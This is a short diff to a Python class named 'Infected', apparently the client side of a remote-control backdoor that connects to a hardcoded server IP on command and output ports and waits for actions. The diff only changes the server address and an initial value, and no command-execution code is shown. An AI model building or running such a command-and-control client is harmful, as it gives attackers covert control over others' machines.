@@ -9,7 +9,7 @@ class Infected:
         self.ipServer = ip
         self.portReceiveCommand = portReceiveCommand
         self.portSendOutput = portSendOutput
-        self.lastAction = None
+        self.lastAction = "None"
         self.isNotFinish = True
         
     def getDataFromSocket(self, socket):
@@ -68,5 +68,5 @@ class Infected:
   
      
     
-inf = Infected("10.9.1.206", 10000, 10001)
+inf = Infected("10.12.5.43", 10000, 10001)
 inf.listenForAction()
